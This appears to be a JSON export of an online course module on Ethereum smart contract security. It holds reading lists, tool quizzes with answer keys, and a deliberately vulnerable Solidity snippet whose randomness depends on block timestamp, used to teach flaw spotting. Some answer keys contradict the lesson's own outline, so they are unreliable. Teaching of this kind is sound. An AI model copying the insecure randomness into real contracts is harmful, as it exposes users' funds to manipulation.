                  {
                    "id": "a1544215994853",
                    "text": "Stay up to date",
                    "is_correct": true
                  },
                  {
                    "id": "a1544216000618",
                    "text": "Be aware of blockchain properties",
                    "is_correct": true
                  },
                  {
                    "id": "a1544216006862",
                    "text": "Disregard security best practices and hope for the best",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791447,
              "key": "90a9e966-6870-42b3-a6fa-ed5fd25fa135",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "> Tip: View the [General Philosophy](https://consensys.github.io/smart-contract-best-practices/general_philosophy/) page for more information.",
              "instructor_notes": ""
            },
            {
              "id": 791448,
              "key": "d93ace47-63a4-43d2-9a7b-4a0ea615ee0d",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0adddf_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/d93ace47-63a4-43d2-9a7b-4a0ea615ee0d",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791450,
              "key": "fdca49c6-ddaa-4679-9717-f45c72bf09fb",
              "title": "Skill Tracker",
              "semantic_type": "TaskListAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "fdca49c6-ddaa-4679-9717-f45c72bf09fb",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "tasks": [
                "Learned about Consensys"
              ],
              "positive_feedback": "Congratulations on gaining new skills!",
              "video_feedback": null,
              "description": "Track the objectives you feel you've gained the skills to complete."
            }
          ]
        },
        {
          "id": 791451,
          "key": "a8ff1e27-ec76-4fd7-8b8d-63756edd0cac",
          "title": "Whitepapers and Research",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "a8ff1e27-ec76-4fd7-8b8d-63756edd0cac",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791453,
              "key": "d2fcb2df-f46a-4e2e-867d-1545eaffb002",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# White papers and Research Overview\n___\n\nOn top of documentation curated by companies in the blockchain space, there is a ton of amazing research happening in this field. Often times, some of the most cutting edge information can be found in these research papers. \n\nWhile it can be dense, it's extremely valuable to be able to read through this information and understand the different topics they present. In this section, we'll go over 3 of these papers that are often referenced in discussions on blockchain security.\n\n# Objectives\n___\n\n*Our goal is to help you do the following things.*\n\n* read through a few, important Blockchain whitepapers\n\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791452,
              "key": "02ac4ff9-306e-4490-8462-56f4623a5c94",
              "title": " Whitepapers And Research",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "tw2d27fLSps",
                "china_cdn_id": "tw2d27fLSps.mp4"
              }
            },
            {
              "id": 791454,
              "key": "a1eb3e9a-6526-44be-b34e-e76d009ce149",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Resources\n___\n\n[A survey of attacks on Ethereum Smart Contracts](https://eprint.iacr.org/2016/1007.pdf)\n\n[Ethereum Smart Contracts: Security Vulnerabilities and Security Tools](https://brage.bibsys.no/xmlui/bitstream/handle/11250/2479191/18400_FULLTEXT.pdf?sequence=1)\n\n[Making Smart Contracts Smarter](https://eprint.iacr.org/2016/633.pdf)\n\n[Consensys: Known Attacks](https://consensys.github.io/smart-contract-best-practices/known_attacks/)\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791455,
              "key": "19765378-e652-4431-891c-79a444fa220e",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# White Paper Outlines\n\nAs mentioned in the video, here is a basic outline of our focus areas that exist in each of these white papers. For now, you can focus specifically on their overview of the **known attacks** to get a better idea of the variety of vulnerabilities that can exist in smart contract code. \n\nAs you read through, notice how many similarities exist between these papers. For example, the **re-entrancy** attack is the same as the DAO attack mentioned earlier, and both of these are mentioned in almost every paper. After skimming through the first time, you'll notice that you're well on your way to understanding each of these attacks in more detail. ",
              "instructor_notes": ""
            },
            {
              "id": 791456,
              "key": "534be225-130b-46c5-b510-dd1b9df7555c",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "### [Making Smart Contracts Smarter](https://eprint.iacr.org/2016/633.pdf)\n\n* Introduction\n*  Background\n* Security Bugs in Contracs\n * Transaction Ordering Dependence\n * Timestamp Dependence\n * Mishandled Exceptions\n * Reentrancy Vulnerability\n\n### [A survey of attacks on Ethereum Smart Contracts](https://eprint.iacr.org/2016/1007.pdf)\n\n* Introduction\n* Background on Ethereum Smart Contracts\n* A taxonomy of vulnerabilities in smart contracts\n * Call to the unknown\n * Exception Disorder\n * Gasless send\n * Type casts\n * Re-entrancy\n * Keeping secrets\n * Immutable bugs\n * Ether lost in transfer\n * Stack size limit\n * Unpredictable state\n * Generating randomness\n * Time constraints\n* Attacks\n * The DAO Attack\n * King of the Ether Throne\n * Multiplayer Games\n * Rubixi\n * GovernMental\n * Dynamic Libraries\n* Discussion\n* References\n\n\n### [Ethereum Smart Contracts: Security Vulnerabilities and Security Tools](https://brage.bibsys.no/xmlui/bitstream/handle/11250/2479191/18400_FULLTEXT.pdf?sequence=1)\n* 3.1.3 Vulnerabilities Explained\n * Reentrancy\n * Tx.origin\n * Callstack depth\n * Timestamp dependence\n * Transaction-ordering dependence\n * Unchecked-send bug\n * Blockhash usage\n * Gasless send\n* 3.2 Smart Contract Attacks and Incidents\n * The DAO\n * King of the Ether Throne\n * Governmental\n * EtherPot\n * SmartBillions\n * TheRun\n",
              "instructor_notes": ""
            },
            {
              "id": 791461,
              "key": "c541cb1c-4e4f-41b3-81ce-834af677b292",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0aded0_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/c541cb1c-4e4f-41b3-81ce-834af677b292",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791457,
              "key": "ea6cbb47-1387-49ac-bbbc-f6278c4cb98b",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Security Bug in Contract\n\nReference this code to complete the quiz below it.\n\n```\ncontract theRun {\n    uint private Last_Payout = 0;\n    uint256 salt = block.timestamp ;\n    function random returns ( uint256 result ){\n        uint256 y = salt * block.number /( salt %5);\n        uint256 seed = block.number/3 + ( salt %300)\n                            + Last_Payout +y;\n        //h = the blockhash of the seed -th last block\n        uint256 h = uint256 ( block . blockhash ( seed ));\n        // random number between 1 and 100\n        return uint256 (h % 100) + 1;\n}}\n```",
              "instructor_notes": ""
            },
            {
              "id": 791458,
              "key": "fd648eb0-2a85-4591-815b-7a37404a0e96",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "fd648eb0-2a85-4591-815b-7a37404a0e96",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "Which vulnerability exists in the code written for the contract above?",
                "answers": [
                  {
                    "id": "a1544216216898",
                    "text": "Mishandled exception",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216224133",
                    "text": "Time-stamp dependent",
                    "is_correct": true
                  },
                  {
                    "id": "a1544216234376",
                    "text": "Reentrancy vulnerability",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216235625",
                    "text": "None",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791459,
              "key": "e802f6a0-1874-4c5e-bc00-fe078c7e77d6",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "> Tip: View [A survey of attacks on Ethereum Smart Contracts](https://eprint.iacr.org/2016/1007.pdf) 4.2 King of the Ether Throne for more information. ",
              "instructor_notes": ""
            },
            {
              "id": 791460,
              "key": "730d92c0-7b1e-4b73-bb64-320ebc0a29af",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0adec8_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/730d92c0-7b1e-4b73-bb64-320ebc0a29af",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791462,
              "key": "5d082c11-89a0-4b90-b2c0-58a54df53757",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Vulnerabilities Explained\n___\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791463,
              "key": "5c420480-f92e-4d99-b45a-c92e434eda0b",
              "title": "",
              "semantic_type": "CheckboxQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "5c420480-f92e-4d99-b45a-c92e434eda0b",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "Which of the following vulnerabilities are explained in [Ethereum Smart Contracts: Security Vulnerabilities and Security Tools](https://brage.bibsys.no/xmlui/bitstream/handle/11250/2479191/18400_FULLTEXT.pdf?sequence=1) 3.13 Vulnerabilities Explained.",
                "answers": [
                  {
                    "id": "a1544216301856",
                    "text": "Reentrancy",
                    "is_correct": true
                  },
                  {
                    "id": "a1544216310094",
                    "text": "Tx.origin",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216315441",
                    "text": "Callstack depth",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216320907",
                    "text": "Timestamp dependence",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216327728",
                    "text": "Transaction-ordering dependence",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216333495",
                    "text": "Unchecked send bug",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216338865",
                    "text": "Blockchain Usage",
                    "is_correct": false
                  },
                  {
                    "id": "a1544216344789",
                    "text": "Gasless send",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791464,
              "key": "be80758c-6f9e-48b5-9396-c315460f315d",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0adf3d_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/be80758c-6f9e-48b5-9396-c315460f315d",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791465,
              "key": "2d448ba8-ee22-4926-852e-578ef8251c10",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Review\n\n___\n\nWhite papers are a great resource for understanding the latest research in any field, and blockchain security is no different. Throughout this section you were introduced to a wide range of research in this field, and hopefully you're starting to get a grasp of the core ideas mentioned throughout each of them.\n\nFor each of these known attacks, try working through the code examples, think about how you might hack the vulnerable code, and really focus on how to prevent these mistakes from entering your code in the future.\n\n## Learn More\n---\nCurious to learn more about smart contract security?\n\n[Learnings from ETHSecurity Community](https://medium.com/coinmonks/learnings-from-the-ethsecurity-community-57431ae0ed5e) - Hear from the Ethereum community themselves about how they are addressing security issues. \n\n[(Not So) Smart Contracts](https://github.com/trailofbits/not-so-smart-contracts)  -  Checkout this repository of common Ethereum smart contract vulnerabilities",
              "instructor_notes": ""
            },
            {
              "id": 791467,
              "key": "91fab88e-1bf3-471e-a540-04775007d5ca",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0adf7a_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/91fab88e-1bf3-471e-a540-04775007d5ca",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791466,
              "key": "99c924ab-fea6-43e2-ba98-c8458dacad7d",
              "title": "Skill Tracker",
              "semantic_type": "TaskListAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "99c924ab-fea6-43e2-ba98-c8458dacad7d",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "tasks": [
                "I've read the \"A survey of attacks on ethereum smart contracts” whitepaper.",
                "I've read the \"Ethereum Smart Contracts: Security vulnerabilities and security tools\" whitepaper.",
                "I've read the \"Making smart contracts smarter\" whitepaper."
              ],
              "positive_feedback": "Congratulations on reading these whitepapers! They can be challenging to get through but are important for this field.",
              "video_feedback": null,
              "description": "Track the whitepaper's you've read."
            }
          ]
        },
        {
          "id": 791468,
          "key": "564c6453-c9aa-4ed5-bf2b-11fc5bfb0b35",
          "title": "Tooling",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "564c6453-c9aa-4ed5-bf2b-11fc5bfb0b35",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791469,
              "key": "6b2664f3-d9c6-48e1-81eb-cdfbcf14ef95",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Tooling\n___\n\nAs you've seen in earlier concepts, reading documentation and current research is an extremely helpful way to stay up to date with current trends in security. That said, it can be difficult to put all of these techniques into practice. To help with this, Ethereum has also developed an ecosystem of tools to help you develop secure applications as efficiently as possible. \n\nMany of these tools are still in their early stages of development, and you may find yourself keeping an eye on them rather than actively using them. In this section, we'll focus on getting you familiar with the tools that exist so that you're able to access the ones you need for your own personal toolbox.\n\n# Objectives\n___\n\n*Our goal is to help you do the following things.*\n\n* identify the Ethereum tools that exist \n\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791470,
              "key": "d7d8b03d-86db-4f3d-90dd-8171a7b8d102",
              "title": "Tooling",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "tItvdsB14aU",
                "china_cdn_id": "tItvdsB14aU.mp4"
              }
            },
            {
              "id": 791472,
              "key": "10c03f0e-7f59-4b5b-a89d-793efcd0fff3",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae26c_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/10c03f0e-7f59-4b5b-a89d-793efcd0fff3",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791471,
              "key": "83eaf61c-1a72-455f-8473-679ece3c62ea",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Resources\n___\n\n[Security Tools](https://ethereum-contract-security-techniques-and-tips.readthedocs.io/en/latest/security_tools/)\n\n[Consensys Tooling](https://consensys.github.io/smart-contract-best-practices/security_tools/)\n\n[Mocha](https://mochajs.org/)",
              "instructor_notes": ""
            },
            {
              "id": 791474,
              "key": "9d70e9ad-e3e6-4d43-aab6-ffa0add66b5d",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae27f_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/9d70e9ad-e3e6-4d43-aab6-ffa0add66b5d",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791473,
              "key": "ba2c19d0-8424-4d2e-9dd6-2624f4983ea5",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Quiz Set\n___\n\nFor each of the following quizzes, visit the link provided on the [Security Tools](https://ethereum-contract-security-techniques-and-tips.readthedocs.io/en/latest/security_tools/) page to learn more about each tool. After answering the quiz, take some time to research some of the basic functionality of each of these tools. \n\nThese tools are not required for our projects, but gaining familiarity with them is a huge step towards integrating them into your personal toolset.",
              "instructor_notes": ""
            },
            {
              "id": 791475,
              "key": "7d1ee9a1-a6a9-4f80-be1f-c2e30fb7f1d1",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Manticore\n___\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791476,
              "key": "2356633c-e80b-463c-ac52-3e6c0d9324ef",
              "title": "",
              "semantic_type": "CheckboxQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "2356633c-e80b-463c-ac52-3e6c0d9324ef",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "What are the core features of Manticore, the dynamic binary analysis tool with EVM support?",
                "answers": [
                  {
                    "id": "a1544217242064",
                    "text": "**Input Generation**: Manticore automatically generates inputs that trigger unique code paths",
                    "is_correct": true
                  },
                  {
                    "id": "a1544217253805",
                    "text": "**Crash Discovery**: Manticore discovers inputs that crash programs via memory safety violations",
                    "is_correct": true
                  },
                  {
                    "id": "a1544217259614",
                    "text": "**Execution Tracing**: Manticore records an instruction-level trace of execution for each generated input",
                    "is_correct": true
                  },
                  {
                    "id": "a1544217264866",
                    "text": "**Programmatic Interface**: Manticore exposes programmatic access to its analysis engine via a Python API",
                    "is_correct": true
                  }
                ]
              }
            },
            {
              "id": 791477,
              "key": "f00761ef-7565-4162-ab19-d2ab4b9673d7",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae2c6_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/f00761ef-7565-4162-ab19-d2ab4b9673d7",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791478,
              "key": "e0399d78-bc37-474f-a06a-185d36516f93",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Mythril\n___",
              "instructor_notes": ""
            },
            {
              "id": 791479,
              "key": "eac36b96-a02e-4893-9dac-1cc97fccae5e",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "eac36b96-a02e-4893-9dac-1cc97fccae5e",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "How does Mythril, the reversing and bug hunting framework for the Ethereum Blockchain, define their core value?",
                "answers": [
                  {
                    "id": "a1544217306367",
                    "text": "A symbolic execution tool for analysis of binaries and smart contracts.",
                    "is_correct": false
                  },
                  {
                    "id": "a1544217317918",
                    "text": "A security analysis tool for Ethereum smart contracts. It uses concolic analysis, taint analysis and control flow checking to detect a variety of security vulnerabilities.",
                    "is_correct": true
                  },
                  {
                    "id": "a1544217323796",
                    "text": " An Analysis Tool for Smart Contracts",
                    "is_correct": false
                  },
                  {
                    "id": "a1544217330071",
                    "text": "Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities.",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791481,
              "key": "3d911389-2375-44ce-82e5-08a7cef37551",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae30d_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/3d911389-2375-44ce-82e5-08a7cef37551",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791480,
              "key": "ab1ab9ec-480d-4d3f-9a9d-1d8908f2ea0b",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Oyente\n___",
              "instructor_notes": ""
            },
            {
              "id": 791482,
              "key": "3f758132-84a0-48f4-903a-00e5f35a7850",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "3f758132-84a0-48f4-903a-00e5f35a7850",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "How does Oyente define their core value?",
                "answers": [
                  {
                    "id": "a1544217379495",
                    "text": "A symbolic execution tool for analysis of binaries and smart contracts.",
                    "is_correct": false
                  },
                  {
                    "id": "a1544217390762",
                    "text": "A security analysis tool for Ethereum smart contracts. It uses concolic analysis, taint analysis and control flow checking to detect a variety of security vulnerabilities.",
                    "is_correct": false
                  },
                  {
                    "id": "a1544217396026",
                    "text": " An Analysis Tool for Smart Contracts",
                    "is_correct": true
                  },
                  {
                    "id": "a1544217402444",
                    "text": "Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities.",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791483,
              "key": "d7e734b8-c156-44eb-9df1-2c383085b75d",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae353_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/d7e734b8-c156-44eb-9df1-2c383085b75d",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 814501,
              "key": "0856a998-105e-431c-83c3-28c55df5371e",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Solgraph\n___\n",
              "instructor_notes": ""
            },
            {
              "id": 814502,
              "key": "dc1d7164-4f97-4201-be83-4688a6f3c1f4",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "dc1d7164-4f97-4201-be83-4688a6f3c1f4",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "How does Oyente define their core value?",
                "answers": [
                  {
                    "id": "a1548706626849",
                    "text": "A symbolic execution tool for analysis of binaries and smart contracts.",
                    "is_correct": false
                  },
                  {
                    "id": "a1548706638413",
                    "text": "A security analysis tool for Ethereum smart contracts. It uses concolic analysis, taint analysis and control flow checking to detect a variety of security vulnerabilities.",
                    "is_correct": false
                  },
                  {
                    "id": "a1548706639176",
                    "text": "An Analysis Tool for Smart Contracts",
                    "is_correct": true
                  },
                  {
                    "id": "a1548706640034",
                    "text": "Generates a DOT graph that visualizes function control flow of a Solidity contract and highlights potential security vulnerabilities.",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 814503,
              "key": "a9ac030a-22e6-4b11-9a76-b65f77ead3a0",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ae353_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/a9ac030a-22e6-4b11-9a76-b65f77ead3a0",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 814475,
              "key": "db845452-544b-4de9-a7ca-de410ce4fa90",
              "title": "Skill Tracker",
              "semantic_type": "TaskListAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "db845452-544b-4de9-a7ca-de410ce4fa90",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "tasks": [
                "identified the Ethereum tools that exist"
              ],
              "positive_feedback": "Congratulations on gaining new skills!",
              "video_feedback": null,
              "description": "Track the objectives you feel you've gained the skills to complete."
            }
          ]
        },
        {
          "id": 814320,
          "key": "92c4eb17-2c40-42bc-b901-2f30e031f55c",
          "title": "Open Zeppelin",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "92c4eb17-2c40-42bc-b901-2f30e031f55c",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 814321,
              "key": "c8b06803-0be2-4f58-8df8-81435cb62fa8",
              "title": "C5L5-08 SC Open Zeppelin",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "TyUxBDvP0OE",
                "china_cdn_id": "TyUxBDvP0OE.mp4"
              }
            },
            {
              "id": 814322,
              "key": "dd0a315e-cd95-41bd-996e-f575c4219018",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Resources:\n---\n\n[Open Zeppelin Home page](https://openzeppelin.org/)\n\n[Open Zeppelin Docs](https://openzeppelin.org/api/docs/open-zeppelin.html)\n\n[Open Zeppelin Access Control](https://openzeppelin.org/api/docs/learn-about-access-control.html)\n\n[Open Zeppelin Ownlable.sol](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/ownership/Ownable.sol)\n\n[Open Zeppelin-Solidity Github](https://github.com/OpenZeppelin/openzeppelin-solidity)\n\n[Open Zeppelin Slack](https://slack.openzeppelin.org/)\n\nhttps://openzeppelin.org/api/docs/open-zeppelin.html ",
              "instructor_notes": ""
            }
          ]
        },
        {
          "id": 814324,
          "key": "468841b7-7faf-46f0-a998-208af18a1f39",
          "title": "Security Audits",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "468841b7-7faf-46f0-a998-208af18a1f39",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 814325,
              "key": "93f2594a-24db-45af-a0f9-4a1626fe5186",
              "title": "C5L5-09 SC Security Audits",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "0QITTCWaLfg",
                "china_cdn_id": "0QITTCWaLfg.mp4"
              }
            },
            {
              "id": 814326,
              "key": "b6e3c41f-380f-406e-8e03-4036cc51d9bb",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Resources: #\n\n---\n[Coinfabrik](https://blog.coinfabrik.com/category/smart-contracts/smart-contract-audit-smart-contracts/ )\n\n[Zeppelin](https://zeppelin.solutions/security-audits/ )",
              "instructor_notes": ""
            }
          ]
        },
        {
          "id": 814327,
          "key": "eb9a1953-9da1-43c0-9c55-be5af67bec24",
          "title": "When Helping Goes Wrong",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "eb9a1953-9da1-43c0-9c55-be5af67bec24",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 814328,
              "key": "697be7d0-648e-4410-bc3f-a0aa21aca8dc",
              "title": "C5L5-10 HS-A When Helping Goes Wrong",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "2LWjSe09DDM",
                "china_cdn_id": "2LWjSe09DDM.mp4"
              }
            }
          ]
        },
        {
          "id": 814329,
          "key": "28f581bb-f277-4fa5-bee7-0f07d96d8bb9",
          "title": "Lesson Recap",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "28f581bb-f277-4fa5-bee7-0f07d96d8bb9",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 814330,
              "key": "055505a0-6292-4b01-b68e-625c9cf9a4fb",
              "title": "C5L5-12 HS Lesson Recap",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "3Bp1DAUQELE",
                "china_cdn_id": "3Bp1DAUQELE.mp4"
              }
            }
          ]
        }
      ]
    }
  },
  "_deprecated": [
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    },
    {
      "name": "non_google_url",
      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
    }
  ]
}